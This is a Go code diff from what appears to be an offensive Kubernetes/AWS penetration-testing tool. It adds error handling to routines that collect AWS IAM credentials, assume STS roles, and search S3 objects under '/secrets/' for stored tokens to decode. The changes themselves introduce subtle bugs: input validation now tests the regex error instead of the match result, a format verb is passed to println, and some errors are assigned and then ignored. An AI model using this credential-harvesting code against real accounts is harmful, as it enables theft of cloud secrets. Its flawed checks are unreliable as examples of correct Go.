@@ -50,14 +50,18 @@ func EnterIamCredentialsForAWS() (AWSCredentials, error) {
 	var component string
 
 	var input string
+	var err error
 
 	component = "AccessKeyId"
 	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
-	fmt.Scanln(&input)
+	_, error := fmt.Scanln(&input)
+	if error != nil {
+		println("[-] Unable to deal with input: %w", input)
+		return credentials, errors.New("invalid " + input)
+	}
 
-	matched, _, err := regexp.MatchString(`\w{18,}`, input)
-
-	if err != nil {
+	matched, error := regexp.MatchString(`\w{18,}`, input)
+	if error != nil {
 		fmt.Printf("Error matching string: %s\n", input)
 	}
 
@@ -70,9 +74,12 @@ func EnterIamCredentialsForAWS() (AWSCredentials, error) {
 
 	component = "SecretAccessKey"
 	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
-	fmt.Scanln(&input)
-	matched, _ = regexp.MatchString(`\w{18,}`, input)
-	if !matched {
+	_, err = fmt.Scanln(&input)
+	if err != nil {
+		return credentials, errors.New("invalid " + component)
+	}
+	matched, err = regexp.MatchString(`\w{18,}`, input)
+	if err != nil {
 		println("String entered isn't a " + component + "\n")
 		return credentials, errors.New("invalid " + component)
 	}
@@ -80,9 +87,12 @@ func EnterIamCredentialsForAWS() (AWSCredentials, error) {
 
 	component = "session token"
 	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
-	fmt.Scanln(&input)
-	matched, _ = regexp.MatchString(`\w{5,}`, input)
-	if !matched {
+	_, err = fmt.Scanln(&input)
+	if err != nil {
+		return credentials, errors.New("invalid " + component)
+	}
+	matched, err = regexp.MatchString(`\w{5,}`, input)
+	if err != nil {
 		println("String entered isn't a " + component + "\n")
 		return credentials, errors.New("Invalid " + component)
 	}
@@ -90,9 +100,12 @@ func EnterIamCredentialsForAWS() (AWSCredentials, error) {
 
 	component = "name or comment"
 	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
-	fmt.Scanln(&input)
-	matched, _ = regexp.MatchString(`\w{1,}`, input)
-	if !matched {
+	_, error = fmt.Scanln(&input)
+	if error != nil {
+		return credentials, errors.New("Invalid " + component)
+	}
+	matched, err = regexp.MatchString(`\w{1,}`, input)
+	if err != nil {
 		println("Name must include at least one alphanumeric character.\n")
 		return credentials, errors.New("invalid " + component)
 	}
@@ -114,7 +127,7 @@ func PullIamCredentialsFromAWS() (AWSCredentials, error) {
 	}
 	// Parse result as an account, then construct a request asking for that account's credentials
 	defer response.Body.Close()
-	body, _ := ioutil.ReadAll(response.Body)
+	body, err := ioutil.ReadAll(response.Body)
 	account := string(body)
 	credentials.accountName = account
 
@@ -126,17 +139,19 @@ func PullIamCredentialsFromAWS() (AWSCredentials, error) {
 		return credentials, errors.New(problem)
 	}
 	defer response2.Body.Close()
-	body2, _ := ioutil.ReadAll(response2.Body)
+	body2, err := ioutil.ReadAll(response2.Body)
 
-	json.Unmarshal(body2, &credentials)
-
+	err = json.Unmarshal(body2, &credentials)
+	if err != nil {
+		println("[-] Error - problem with JSON unmarshal")
+	}
 	return credentials, nil
 
 }
 
 func AWSSTSAssumeRole(IAMCredentials AWSCredentials, roleToAssumeArn string) (AssumedCredentials AWSCredentials, err error) {
 
-	matched, _ := regexp.MatchString(`arn:aws:iam::\d{12,}:\w+\/\w+`, roleToAssumeArn)
+	matched, err := regexp.MatchString(`arn:aws:iam::\d{12,}:\w+\/\w+`, roleToAssumeArn)
 	if !matched {
 		return AssumedCredentials, errors.New("invalid role entered by user")
 	}
@@ -311,7 +326,7 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount) (err error) {
 
 	println("[1] Store all tokens found in Peirates data store")
 	println("[2] Retrieve all tokens - I will copy and paste")
-	fmt.Scanln(&storeTokens)
+	_, err = fmt.Scanln(&storeTokens)
 	storeTokens = strings.TrimSpace(storeTokens)
 
 	if storeTokens == "1" {
@@ -369,24 +384,27 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount) (err error) {
 			if strings.Contains(*item.Key, "/secrets/") {
 				fmt.Println("Investigating bucket object for tokens:  " + *item.Key)
 
-				result, err := svc.GetObject(&s3.GetObjectInput{
+				result, error := svc.GetObject(&s3.GetObjectInput{
 					Bucket: aws.String(bucket),
 					Key:    aws.String(*item.Key),
 				})
 
-				if err != nil {
+				if error != nil {
 					continue
 				}
 
 				buf := new(bytes.Buffer)
-				buf.ReadFrom(result.Body)
+				_, err = buf.ReadFrom(result.Body)
 				jsonOutput := buf.String()
 				byteEncodedJsonOutput := []byte(jsonOutput)
 				// Unmarshall the json into Data : encodedtoken
 
 				var structuredVersion AWSS3BucketObject
 
-				json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
+				error = json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
+				if error != nil {
+					continue
+				}
 				encodedToken := structuredVersion.Data
 				println("Encoded token: " + encodedToken)
 				token, err := base64.StdEncoding.DecodeString(encodedToken)
